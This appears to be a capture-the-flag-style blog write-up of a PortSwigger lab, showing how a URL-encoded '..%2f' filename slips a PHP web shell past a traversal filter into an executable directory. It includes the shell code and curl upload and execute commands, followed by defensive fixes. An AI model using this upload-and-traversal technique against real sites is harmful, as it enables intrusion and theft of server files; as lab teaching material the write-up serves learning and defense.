---
layout: post
title: "PortSwigger: Web shell upload via path traversal"
date: 2027-12-15 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, FileUpload]
tags: [portswigger, file-upload, path-traversal, web-shell, url-encoding, php, cwe-434, cwe-22]
---

An avatar uploader that runs whatever you give it is the classic [unrestricted file upload](https://cwe.mitre.org/data/definitions/434.html) ([CWE-434](https://cwe.mitre.org/data/definitions/434.html)). This lab adds a twist: the directory your file lands in is deliberately configured *not* to execute PHP, so a plain upload just shows you source code. The way through is to make the file land somewhere else — using a [path traversal](https://cwe.mitre.org/data/definitions/22.html) ([CWE-22](https://cwe.mitre.org/data/definitions/22.html)) in the filename, smuggled past the filter with URL encoding.

## Overview

The site lets a logged-in user upload an avatar. Uploaded files are saved into `/files/avatars/` and served back — but that directory serves `.php` as **plain text**, so uploading `exploit.php` and visiting it just dumps the source. The goal is to run a PHP web shell and read `/home/carlos/secret`. To get execution we plant the file one directory up, in `/files/`, where PHP *does* run — by putting `../` in the upload filename. The app strips `../`, so we hide the slash as `%2f`.

## The technique

Two defenses each work in isolation but fail together:

1. **The upload directory is non-executable.** `/files/avatars/exploit.php` is returned as text, not run. That's a real mitigation on its own.
2. **The filename filter strips `../`.** So a filename of `../exploit.php` gets sanitized before the file is saved.

The bug is the *order*: the app strips `../` **before** it URL-decodes the filename. Send the traversal slash URL-encoded:

```
..%2fexploit.php
```

- The strip pass looks for a literal `../` — there is none (`..%2f` is not `../`), so the name passes through untouched.
- The server then URL-decodes the filename, turning `%2f` back into `/`, yielding `../exploit.php`.
- The file is written one level up, into `/files/`, where PHP executes.

This "validate first, decode later" ordering is the entire flaw.

## Solution

Log in as `wiener:peter`, scrape the avatar form's CSRF token, then upload a read-only PHP shell with an encoded-traversal filename.

Create the web shell:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Upload it with the traversal filename, then execute it from the parent directory:

```bash
BASE="https://<lab-id>.web-security-academy.net"

printf '%s' "<?php echo file_get_contents('/home/carlos/secret'); ?>" > exploit.php

curl -s -b cookies.txt "$BASE/my-account/avatar" \
  -F "user=wiener" -F "csrf=$CSRF" \
  -F 'avatar=@exploit.php;filename=..%2fexploit.php;type=text/php'

curl -s -b cookies.txt "$BASE/files/exploit.php"
```

The final request returns the secret. Note the path: `GET /files/exploit.php` runs the shell, while `GET /files/avatars/exploit.php` returns **404** — proof the file traversed up one level out of the non-executing avatars directory. Submit the recovered secret via the lab banner and it flips to **Solved**.

A read-only `file_get_contents` shell is enough here — the goal is reading one known file, so we skip a `?cmd=` parameter, which is smaller and less obviously a web shell.

## Why it worked

Each control is sound in isolation: keeping the upload directory non-executable is defense in depth, and stripping `../` blocks traversal. They fail only in *combination*, because the traversal filter inspects the raw input while the filesystem sees the decoded input — and those differ the moment you encode the slash as `%2f`. You slip a `/` past the check by keeping it encoded until after validation has already run.

## Fix / defense

- **Decode fully first, then validate and canonicalize.** Resolve the final path (e.g. with `realpath`) and confirm it stays inside the intended upload directory before writing.
- **Never trust the client-supplied filename** — generate a random server-side name.
- **Store uploads outside the web root** or on a store that never executes code, and serve them through a handler that forces a safe `Content-Type`.
- **Whitelist the extension *and* validate the file contents**, not just one of the two.
